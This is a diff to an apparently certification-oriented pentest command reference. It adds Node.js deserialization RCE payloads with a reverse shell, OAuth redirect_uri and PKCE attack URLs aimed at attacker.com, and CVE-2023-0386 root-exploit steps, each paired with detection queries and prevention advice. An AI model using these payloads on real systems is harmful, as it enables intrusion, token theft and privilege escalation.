       "id": "crtp-network-recon",
       "name": "Network Recon (CRTP Foothold)",
       "command": "nmap -sV -sC -p 53,88,135,139,389,445,464,636,3268,3269 <dc_ip>",
@@ -111008,6 +114253,114 @@ const COMMAND_DATA = {
       "explain": "Runs Nmap Scripting Engine checks for deeper enumeration:\n  -sC   run the default script category\nNSE Lua scripts do version-specific enumeration and vuln checks; target categories (--script <category>) or named scripts (--script banner,smtp-commands), and -A bundles -sC -sV -O --traceroute."
     },
     {
+      "id": "deser-nodejs",
+      "name": "Node.js node-serialize unserialize() RCE",
+      "command": "node -e \"var s=require('node-serialize');console.log(s.serialize({rce:function(){require('child_process').exec('<command>')}()}))\"",
+      "description": "The node-serialize package's unserialize() will evaluate a function embedded in the serialized data when it is tagged with the _$$ND_FUNC$$_ marker and wrapped as an Immediately Invoked Function Expression (IIFE), giving remote code execution the moment unserialize() runs on attacker input. The same flaw affects funcster and serialize-to-js and any serializer that restores JavaScript functions.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Deserialization",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "node-serialize; OpsecX",
+      "tags": [
+        "deserialization",
+        "nodejs",
+        "node-serialize",
+        "unserialize",
+        "funcster",
+        "iife",
+        "rce"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== IDENTIFY A NODE SERIALIZE SINK ===\n  # App calls require('node-serialize').unserialize(req.cookies/body) or similar.\n  # Payloads carry the marker _$$ND_FUNC$$_ followed by a function body.\n\n=== BUILD THE PAYLOAD ===\n  # A serialized function is tagged: \"_$$ND_FUNC$$_function(){...}\".\n  # Appending () after the function body turns it into an IIFE that runs on unserialize().\n  {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()\"}\n\n=== REVERSE SHELL PAYLOAD ===\n  {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/<ip>/<port> 0>&1\\\"');}()\"}\n  # Deliver as a cookie/body value where unserialize() reads it.\n\n=== GENERATE WITH node-serialize ITSELF ===\n  var serialize = require('node-serialize');\n  var o = {rce: function(){ require('child_process').exec('id'); }};\n  var payload = serialize.serialize(o);\n  // then edit the serialized string to append () after the function so it self-invokes.\n\n=== TRIGGER ===\n  var serialize = require('node-serialize');\n  serialize.unserialize(attacker_json);   // IIFE fires -> command runs\n\n=== VARIANTS ===\n  funcster.deepDeserialize(data)      # evaluates module-wrapped functions\n  serialize-to-js deserialize()       # function restoration\n  cryo / older custom serializers\n\n=== ALTERNATIVES ===\n  Python pickle - see deser-python-pickle\n  PHP phpggc - see deser-php-phpggc",
+      "examples": [
+        {
+          "label": "node-serialize IIFE RCE cookie value",
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\"}"
+        },
+        {
+          "label": "Reverse shell IIFE payload",
+          "command": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/<ip>/<port> 0>&1\\\"');}()\"}"
+        },
+        {
+          "label": "Serialize an object to get the function format",
+          "command": "node -e \"var s=require('node-serialize');console.log(s.serialize({rce:function(){}}))\""
+        }
+      ],
+      "references": [
+        {
+          "title": "node-serialize (npm)",
+          "url": "https://www.npmjs.com/package/node-serialize"
+        },
+        {
+          "title": "OpsecX - Exploiting Node.js deserialization for RCE",
+          "url": "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"
+        },
+        {
+          "title": "OWASP Deserialization Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Generic multi-language deserialization hub card.",
+          "rel": "prereq"
+        },
+        {
+          "id": "deser-php-phpggc",
+          "note": "PHP object-injection chains, a sibling runtime.",
+          "rel": "alternative"
+        },
+        {
+          "id": "deser-python-pickle",
+          "note": "Python pickle RCE, a sibling runtime.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "node-serialize restores JavaScript functions from its serialized form; the _$$ND_FUNC$$_ marker tells it to eval the function body, and an appended () makes that function self-invoke during unserialize(). Restoring executable code from untrusted input is the bug.",
+        "prerequisites": "An endpoint passing attacker-controlled data to node-serialize unserialize() (or funcster/serialize-to-js equivalents).",
+        "impact": "Remote code execution as the Node.js process user.",
+        "detection": "[MITRE T1190] Requests/cookies containing the literal _$$ND_FUNC$$_ marker or child_process references; [MITRE T1059] the node process spawning sh/bash/cmd children.",
+        "artifacts": "Web/proxy logs and cookie values with _$$ND_FUNC$$_ or child_process.exec strings; EDR/auditd process tree node -> sh/bash; outbound connections from the app host.",
+        "splunk_spl": "index=web (request_body=\"*_$$ND_FUNC$$_*\" OR http_cookie=\"*_$$ND_FUNC$$_*\" OR request_body=\"*child_process*\")\n| table _time, src_ip, uri_path, request_body",
+        "elastic_kql": "http.request.body.content:(*ND_FUNC* or *child_process*) or http.request.headers.cookie:*ND_FUNC*",
+        "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"node\",\"node.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "sigma_rules": "web_nodejs_node_serialize_nd_func_payload",
+        "prevention": "Do not use node-serialize/funcster on untrusted input; use JSON.parse (which never restores functions). Validate and schema-check all input; keep dependencies audited (npm audit); run the Node process least-privileged and segmented.",
+        "sources": [
+          "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
+          "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Node.js process spawning a shell (node-serialize RCE)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"node\",\"node.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Node tooling or build steps that spawn shells",
+            "tuning": "Scope to production app tiers; allowlist known CI/deploy hosts"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-nopac-exploit",
       "name": "NoPac - Exploit CVE-2021-42278/42287 (DA Shell)",
       "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator -use-ldap",
@@ -111767,6 +115120,222 @@ const COMMAND_DATA = {
         "sources": [
           "HTU engagement playbook",
           "https://attack.mitre.org/techniques/T1595/002/"
+        ]
+      }
+    },
+    {
+      "id": "web-oauth-state-pkce",
+      "name": "OAuth state / PKCE Weaknesses (Login CSRF, Code Interception)",
+      "command": "GET /authorize?client_id=<client_id>&redirect_uri=<url>&response_type=code&scope=openid",
+      "description": "Exploits a missing or unvalidated state parameter (OAuth login CSRF - forcing a victim to log in as the attacker), PKCE downgrade or code_challenge stripping (so an intercepted authorization code can be redeemed without the verifier), and implicit-flow access-token leakage via the Referer header or browser history.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Authentication",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - OAuth",
+      "tags": [
+        "oauth",
+        "oidc",
+        "pkce",
+        "csrf",
+        "state",
+        "code-interception"
+      ],
+      "mitre": [
+        "T1190",
+        "T1528",
+        "T1539"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== MISSING / UNVALIDATED state (login CSRF) ===\n  The state parameter binds the /authorize request to the user's session (CSRF token). If absent or unchecked:\n  1. Attacker starts a login, captures their own ?code=... at the callback (does NOT complete it).\n  2. Attacker tricks the victim into visiting /callback?code=<attacker_code>.\n  3. Victim's RP session is now logged in AS THE ATTACKER - victim's data (cards, uploads) flows to the attacker account.\n  Test: remove state entirely, or replay a request with a different user's state - does login still succeed?\n\n=== PKCE DOWNGRADE / code_challenge STRIPPING ===\n  PKCE binds the code to a code_verifier. Weaknesses:\n  - Server accepts token exchange WITHOUT code_verifier when code_challenge was sent (downgrade).\n  - code_challenge_method=plain accepted (verifier == challenge, no SHA-256 protection).\n  - Server ignores a mismatched verifier.\n  Test: send authorize with code_challenge, then redeem at /token with NO code_verifier, or a wrong one.\n\n=== IMPLICIT-FLOW TOKEN LEAK ===\n  response_type=token puts the access_token in the URL fragment. Leaks via:\n  - Referer header to third-party resources loaded by the callback page.\n  - Browser history / proxy logs if copied to the query string.\n  - An open redirect that carries the fragment onward.\n\n=== TOOLING ===\n  - Burp Repeater: strip state / verifier, replay the /token POST.\n  - Burp 'Request Smuggler' not needed; use Repeater + a CSRF PoC (Burp > Generate CSRF PoC).\n  - Observe code_challenge_method and whether /token enforces it.",
+      "examples": [
+        {
+          "label": "Login-CSRF PoC forcing victim into attacker session",
+          "command": "<img src=\"https://app.example.com/oauth/callback?code=ATTACKER_CODE\">"
+        },
+        {
+          "label": "Redeem a code at /token with NO code_verifier (PKCE downgrade)",
+          "command": "curl -s https://sso.example.com/token -d grant_type=authorization_code -d code=<token> -d client_id=webapp -d redirect_uri=https://app.example.com/cb"
+        },
+        {
+          "label": "Force the weaker plain PKCE method",
+          "command": "https://sso.example.com/authorize?client_id=webapp&response_type=code&scope=openid&redirect_uri=https://app.example.com/cb&code_challenge=abc&code_challenge_method=plain"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - OAuth 2.0 authentication vulnerabilities",
+          "url": "https://portswigger.net/web-security/oauth"
+        },
+        {
+          "title": "RFC 7636 - PKCE",
+          "url": "https://datatracker.ietf.org/doc/html/rfc7636"
+        },
+        {
+          "title": "RFC 9700 - OAuth 2.0 Security Best Current Practice",
+          "url": "https://datatracker.ietf.org/doc/html/rfc9700"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-oauth-redirect-uri-abuse",
+          "note": "Redirect_uri abuse is the usual code-interception primitive this chains with.",
+          "rel": "prereq"
+        },
+        {
+          "id": "cors-misconfiguration",
+          "note": "CORS flaws can exfil tokens that OAuth clients store client-side.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-jwt-attacks",
+          "note": "Attack the id_token/access_token JWT once leaked.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When state is absent or unverified the authorization callback is not bound to the initiating session, enabling login CSRF. When PKCE is advertised but not enforced at /token, an intercepted code can be redeemed without the verifier. Implicit-flow tokens in the URL fragment leak through the browser.",
+        "prerequisites": "A known authorization endpoint and client_id. For login CSRF, the ability to deliver a crafted callback URL to the victim. For PKCE downgrade, a client that initiates PKCE but a server that does not strictly enforce it.",
+        "impact": "Login CSRF yields victim data captured into an attacker-controlled account; PKCE downgrade enables full code interception and account takeover; implicit-flow leaks expose bearer access tokens.",
+        "detection": "[MITRE T1190] /authorize requests with no state parameter, repeated use of the same state across sessions/IPs, and /token exchanges that omit code_verifier despite a prior code_challenge. Access tokens appearing in Referer or query strings in logs.",
+        "artifacts": "IdP and reverse-proxy logs for /authorize (state, code_challenge, code_challenge_method) and /token (presence/absence of code_verifier), plus Referer headers carrying fragments.",
+        "splunk_spl": "index=web (uri_path=\"/authorize\" OR uri_path=\"/token\")\n| rex field=uri_query \"(?<has_state>state=)\"\n| rex field=form_data \"(?<has_verifier>code_verifier=)\"\n| where uri_path=\"/authorize\" AND isnull(has_state)",
+        "elastic_kql": "url.path:\"/authorize\" and not url.query:*state=* or (url.path:\"/token\" and not http.request.body.content:*code_verifier*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem in (\"/authorize\",\"/token\")\n| extend hasState = csUriQuery has \"state=\"\n| where csUriStem == \"/authorize\" and hasState == false\n| summarize count() by cIP, csUriStem",
+        "sigma_rules": "web_oauth_missing_state_or_pkce",
+        "prevention": "Require a cryptographically random, single-use, session-bound state and reject callbacks without it. Enforce PKCE (S256 only; reject plain and reject exchanges missing a valid code_verifier). Use the authorization-code flow, never implicit. Set Referrer-Policy: no-referrer on callback pages.",
+        "sources": [
+          "https://portswigger.net/web-security/oauth",
+          "https://datatracker.ietf.org/doc/html/rfc7636"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "OAuth /authorize missing state parameter",
+            "logic": "index=web sourcetype=nginx uri_path=\"/authorize\" method=GET\n| where NOT match(uri_query, \"(^|&)state=\")\n| stats count by clientip, useragent, uri_query",
+            "data_source": "nginx",
+            "attack": [
+              "T1190",
+              "T1539"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Non-interactive service clients or health checks hitting /authorize.",
+            "tuning": "Scope to interactive user-agents and require a prior session cookie; baseline legitimate flows that always include state."
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-oauth-redirect-uri-abuse",
+      "name": "OAuth2/OIDC redirect_uri Validation Abuse",
+      "command": "GET /authorize?client_id=<client_id>&redirect_uri=<url>&response_type=code&scope=openid&state=<state>",
+      "description": "Abuses weak redirect_uri validation at an OAuth2/OIDC authorization endpoint to redirect the authorization code or token to an attacker-controlled destination. Covers prefix/substring/host-only matching, appended path or query tricks, open-redirect chaining on an allow-listed domain, path traversal, and parameter pollution that leaks the code to a server you control, leading to account takeover.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Authentication",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - OAuth",
+      "tags": [
+        "oauth",
+        "oidc",
+        "redirect-uri",
+        "account-takeover",
+        "open-redirect",
+        "sso"
+      ],
+      "mitre": [
+        "T1190",
+        "T1528",
+        "T1539"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  The authorization server is supposed to match redirect_uri against the client's pre-registered value EXACTLY. When it instead does prefix, substring, or host-only matching (or allows an open redirect on the trusted host), the code/token is delivered to an attacker endpoint.\n\n=== VALIDATION GAPS TO TEST ===\n  - Exact-match bypass by appended path:   redirect_uri=https://app.example.com.attacker.com\n  - Prefix match:                          redirect_uri=https://app.example.com@attacker.com\n  - Host-only match + path traversal:      redirect_uri=https://app.example.com/callback/../../attacker\n  - Appended params / HPP:                 redirect_uri=https://app.example.com/cb&redirect_uri=https://attacker.com\n  - Localhost / loopback allowance:        redirect_uri=http://localhost.attacker.com\n  - Open redirect on trusted host:         redirect_uri=https://app.example.com/redirect?to=https://attacker.com\n  - Weak scheme:                           redirect_uri=javascript://... or data://...\n\n=== STEAL THE CODE (code flow) ===\n  1. Craft an /authorize URL with your redirect_uri and send it to a logged-in victim.\n  2. Victim's browser is redirected with ?code=... to your endpoint.\n  3. Exchange the code at /token using the (often public) client_id + PKCE verifier if required.\n\n=== IMPLICIT FLOW (token in fragment) ===\n  response_type=token delivers the access token in the URL fragment; an open redirect or a page that leaks document.location / Referer exposes it.\n\n=== TOOLING ===\n  - Burp Suite: capture the /authorize request in Repeater, mutate redirect_uri.\n  - Burp extension 'OAuth2 / OIDC' or hackvertor for encoding.\n  - Note the client_id, scopes, response_type, and whether PKCE (code_challenge) is enforced.\n\n=== RELATED ===\n  - Combine with a missing/unvalidated state (see web-oauth-state-pkce) for login CSRF.\n  - Open-redirect primitive overlaps with CRLF / header-based redirects.",
+      "examples": [
+        {
+          "label": "Subdomain-suffix bypass stealing the code",
+          "command": "https://sso.example.com/authorize?client_id=webapp&response_type=code&scope=openid&redirect_uri=https://app.example.com.attacker.com/cb&state=xyz"
+        },
+        {
+          "label": "Open redirect on trusted host to exfil the token",
+          "command": "https://sso.example.com/authorize?client_id=webapp&response_type=token&redirect_uri=https://app.example.com/out?url=https://attacker.com&state=xyz"
+        },
+        {
+          "label": "Exchange a stolen code at the token endpoint",
+          "command": "curl -s https://sso.example.com/token -d grant_type=authorization_code -d code=<token> -d client_id=webapp -d redirect_uri=https://app.example.com.attacker.com/cb"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - OAuth 2.0 authentication vulnerabilities",
+          "url": "https://portswigger.net/web-security/oauth"
+        },
+        {
+          "title": "RFC 6749 - OAuth 2.0 (redirect_uri)",
+          "url": "https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2"
+        },
+        {
+          "title": "OAuth 2.0 Security Best Current Practice (RFC 9700)",
+          "url": "https://datatracker.ietf.org/doc/html/rfc9700"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-oauth-state-pkce",
+          "note": "Pair with missing state / PKCE downgrade for login CSRF and token leaks.",
+          "rel": "next"
+        },
+        {
+          "id": "web-jwt-attacks",
+          "note": "OIDC id_tokens are JWTs - attack the token after acquisition.",
+          "rel": "next"
+        },
+        {
+          "id": "ssrf-identify",
+          "note": "Open-redirect primitives on trusted hosts also feed SSRF chains.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Authorization servers that match redirect_uri loosely (prefix, substring, host-only, or honoring an open redirect on the registered host) deliver the authorization code or token to an attacker endpoint. Public clients with no client secret make exchanging a stolen code trivial.",
+        "prerequisites": "A valid client_id and a known authorization endpoint. The victim must be authenticated to the IdP and must open the crafted /authorize link (or it must auto-approve).",
+        "impact": "Theft of the authorization code or access/ID token leading to full account takeover of the victim's account on the relying party, and access to any API scopes granted to the client.",
+        "detection": "[MITRE T1190] Web/proxy logs showing /authorize requests whose redirect_uri does not exactly equal a registered value - unexpected hosts, userinfo (@), appended paths, or doubled redirect_uri parameters. Spikes of code grants redirected off-domain.",
+        "artifacts": "Reverse-proxy and IdP access logs for the /authorize and /token endpoints (redirect_uri parameter, client_id, response_type), referrer headers leaking fragments, and authorization-code exchanges from unexpected source IPs.",
+        "splunk_spl": "index=web uri_path=\"/authorize\" \n| rex field=uri_query \"redirect_uri=(?<redir>[^&]+)\" \n| eval redir=urldecode(redir) \n| search NOT redir IN (\"https://app.example.com/cb\") \n| stats count by clientip, redir, client_id",
+        "elastic_kql": "url.path:\"/authorize\" and url.query:*redirect_uri* and not url.query:\"redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb\"",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem == \"/authorize\"\n| extend redir = extract(@\"redirect_uri=([^&]+)\", 1, csUriQuery)\n| where isnotempty(redir) and redir !startswith \"https%3A%2F%2Fapp.example.com\"\n| summarize count() by cIP, redir",
+        "sigma_rules": "web_oauth_redirect_uri_mismatch",
+        "prevention": "Require exact string match of redirect_uri against the pre-registered value (no prefix/substring/wildcard). Register full URIs including path. Mandate PKCE for all clients and bind the code to the verifier. Never host open redirects on the IdP or RP domains. Use response_type=code (not token) and short-lived single-use codes.",
+        "sources": [
+          "https://portswigger.net/web-security/oauth",
+          "https://datatracker.ietf.org/doc/html/rfc9700"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "OAuth /authorize with non-registered redirect_uri",
+            "logic": "index=web uri_path=\"/authorize\"\n| rex field=uri_query \"redirect_uri=(?<redir>[^&]+)\"\n| eval redir=urldecode(redir)\n| regex redir!=\"^https://app\\.example\\.com/\"\n| stats count values(redir) as redirs by clientip, client_id",
+            "data_source": "iis",
+            "attack": [
+              "T1190",
+              "T1528"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Newly onboarded clients with additional registered callback URLs; staging redirect hosts.",
+            "tuning": "Maintain an allow-list of registered redirect_uri values per client_id and alert only on deviations."
+          }
         ]
       }
     },
@@ -114607,6 +118176,111 @@ const COMMAND_DATA = {
       "explain": "Maps GPOs so you can spot policy you can abuse for code execution or local admin:\n  Get-DomainGPO            list every Group Policy Object\n  | select displayname,gpcfilesyspath   the friendly name and its SYSVOL path\nFollow up by resolving OU gplinks to GPOs (which computers a policy hits), Get-DomainGPOLocalGroup (GPO-granted local admin), and checking GPO ACLs for WriteProperty/WriteDacl - a writable GPO is a foothold on every computer in its OU."
     },
     {
+      "id": "linux-overlayfs-cve-2023-0386",
+      "name": "OverlayFS cap_setuid copy-up LPE (CVE-2023-0386)",
+      "command": "./exp   # fuse+overlayfs copy-up of a cap_setuid SUID binary to root",
+      "description": "CVE-2023-0386 is a Linux kernel OverlayFS flaw: when a file owned by a privileged user on a FUSE-backed lower layer is copied up to the overlay upper layer, the kernel fails to drop its SUID/capability bits in an unprivileged user+mount namespace. An attacker stages a SUID-root (or cap_setuid) binary over FUSE, copies it up through an unprivileged OverlayFS mount, and executes it as root. Affects Linux kernels before 6.2 (fixed in 6.2-rc6 / backports); widely exploited on Ubuntu 22.04 and Centos/RHEL derivatives.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Privilege Escalation",
+      "subcategory": "Linux - Kernel and glibc Exploits",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Datadog Security Labs / CVE-2023-0386",
+      "tags": [
+        "cve-2023-0386",
+        "overlayfs",
+        "fuse",
+        "capabilities",
+        "kernel",
+        "privesc"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHAT IT IS ===\n  OverlayFS copy-up does not sanitize the SUID bit / file capabilities when the lower\n  file lives on a nosuid FUSE mount and the overlay is created in an unprivileged\n  user namespace. The copied-up file in the upper dir keeps its setuid/cap_setuid,\n  so running it gives root.\n\n=== PREREQUISITES CHECK ===\n  uname -r                              # vulnerable: < 6.2 (and un-backported distro kernels)\n  cat /proc/sys/kernel/unprivileged_userns_clone   # must be 1 (userns allowed)\n  sysctl kernel.unprivileged_userns_clone\n  which fusermount fusermount3          # FUSE present\n\n=== PUBLIC PoC ===\n  git clone https://github.com/xkaneiki/CVE-2023-0386\n  cd CVE-2023-0386\n  make all\n  # terminal 1:\n  ./fuse ./ovlcap/lower ./gc        # start the FUSE lower with a cap_setuid file\n  # terminal 2:\n  ./exp                             # copy-up + exec -> root shell\n  id                                # uid=0\n\n=== ALSO ===\n  # sxlmnxp/CVE-2023-0386 and other mirrors package the same chain.\n  # Needs gcc + make locally (or compile the three binaries offline and drop them in).\n\n=== ALTERNATIVES ===\n  looney-tunables (CVE-2023-4911) / nf_tables (CVE-2024-1086)   # other local root paths",
+      "examples": [
+        {
+          "label": "Confirm kernel is pre-6.2 and userns is allowed",
+          "command": "uname -r; sysctl kernel.unprivileged_userns_clone"
+        },
+        {
+          "label": "Build the PoC (FUSE helper + exploit)",
+          "command": "git clone https://github.com/xkaneiki/CVE-2023-0386 && cd CVE-2023-0386 && make all"
+        },
+        {
+          "label": "Run FUSE lower then the exploit to get root",
+          "command": "./fuse ./ovlcap/lower ./gc &\n./exp"
+        }
+      ],
+      "references": [
+        {
+          "title": "NVD - CVE-2023-0386",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0386"
+        },
+        {
+          "title": "Datadog Security Labs analysis",
+          "url": "https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/"
+        },
+        {
+          "title": "PoC - xkaneiki/CVE-2023-0386",
+          "url": "https://github.com/xkaneiki/CVE-2023-0386"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "kernel-exploit-generic",
+          "note": "General kernel-exploit workflow this fits into.",
+          "rel": "prereq"
+        },
+        {
+          "id": "linux-looney-tunables",
+          "note": "glibc local root to try when the kernel is patched.",
+          "rel": "alternative"
+        },
+        {
+          "id": "capabilities",
+          "note": "The abused primitive is a cap_setuid file surviving copy-up.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "OverlayFS copy_up logic transfers a lower-layer file to the upper layer without clearing its setuid bit or file capabilities when the lower layer is a nosuid FUSE mount reachable inside an unprivileged user+mount namespace. The attacker controls the lower file (via FUSE) so it carries cap_setuid; after copy-up the upper file executes with root capabilities on a suid-honoring filesystem.",
+        "prerequisites": "Local unprivileged shell. Kernel older than 6.2 (or an un-backported distro kernel), unprivileged user namespaces enabled (kernel.unprivileged_userns_clone=1), and FUSE available. gcc/make to build the PoC (or precompiled binaries).",
+        "impact": "Local privilege escalation to root on default Ubuntu 22.04 and many enterprise kernels - reliable, memory-corruption-free, and therefore stealthier than a typical kernel heap exploit.",
+        "detection": "[MITRE T1068] Unprivileged creation of user+mount namespaces immediately followed by an OverlayFS mount and a FUSE mount; execution of a newly copied-up SUID/capability binary from an overlay upper directory; a root process parented by an unprivileged user.",
+        "artifacts": "auditd mount/execve records for overlay and fuse filesystems by a non-root auid; unshare/clone with CLONE_NEWUSER|CLONE_NEWNS; a SUID or cap_setuid file appearing in an overlay upperdir.",
+        "splunk_spl": "index=linux sourcetype=\"linux:auditd\" (syscall=mount OR type=EXECVE)\n| search (proctitle=\"*fuse*\" OR proctitle=\"*overlay*\" OR exe=\"*fusermount*\")\n| where auid!=0\n| table _time, host, auid, exe, proctitle",
+        "elastic_kql": "event.action:(mounted or exec) and (process.name:(fusermount or fusermount3) or process.args:*overlay*) and not user.name:root",
+        "sentinel_kql": "DeviceProcessEvents\n| where ProcessCommandLine has_any (\"fuse\",\"overlay\",\"unshare\") and InitiatingProcessAccountName != \"root\"\n| join kind=inner (DeviceProcessEvents | where ProcessCommandLine has \"fusermount\") on DeviceId\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine\n// unprivileged overlayfs+fuse copy-up of a cap_setuid file (CVE-2023-0386)",
+        "sigma_rules": "lnx_overlayfs_fuse_copyup_suid (unprivileged overlay+fuse copy-up of a setuid/cap file)",
+        "prevention": "Patch to a kernel with the CVE-2023-0386 fix (mainline 6.2; Ubuntu linux 5.15.0-70 / 5.19.0-38 and later; RHEL/CentOS vendor patches). Where possible set kernel.unprivileged_userns_clone=0 and restrict FUSE to break the exploit chain; mount user-writable filesystems nosuid.",
+        "sources": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2023-0386",
+          "https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Unprivileged overlayfs+fuse copy-up (CVE-2023-0386)",
+            "logic": "DeviceProcessEvents\n| where InitiatingProcessAccountName != \"root\"\n| where ProcessCommandLine has_any (\"fusermount\",\"fusermount3\") or (ProcessCommandLine has \"unshare\" and ProcessCommandLine has_any (\"-U\",\"--map-root\"))\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Containers and sandboxes (bubblewrap, rootless podman, AppImage) legitimately use FUSE and user namespaces.",
+            "tuning": "Correlate with an overlay mount and execution of a SUID file from an overlay upperdir; allowlist known sandbox binaries."
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-overpass-hash",
       "name": "Overpass-the-Hash / Pass-the-Key (Rubeus asktgt)",
       "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt_hash> /domain:<domain> /ptt /opsec",
@@ -114994,6 +118668,128 @@ const COMMAND_DATA = {
           "Web recon methodology",
           "https://attack.mitre.org/techniques/T1596/"
         ]
+      }
+    },
+    {
+      "id": "win-parent-pid-spoofing",
+      "name": "Parent PID Spoofing with BlockDLLs",
+      "command": "CreateProcess with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS set to a chosen PID",
+      "description": "Parent PID (PPID) spoofing uses UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to make a new process appear to be a child of an attacker-chosen parent (for example explorer.exe), defeating parent-child heuristics that flag, say, Word spawning PowerShell. It is usually paired with the BlockDLLs attribute (PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES) to stop non-Microsoft (EDR hook) DLLs loading into the child.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Defense Evasion",
+      "subcategory": "Process Injection",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1134.004; public PPID-spoofing and BlockDLLs research",
+      "tags": [
+        "ppid-spoofing",
+        "block-dlls",
+        "evasion",
+        "access-token",
+        "parent-process",
+        "defense-evasion"
+      ],
+      "mitre": [
+        "T1134.004",
+        "T1134"
+      ],
+      "exam": "exam-ok",
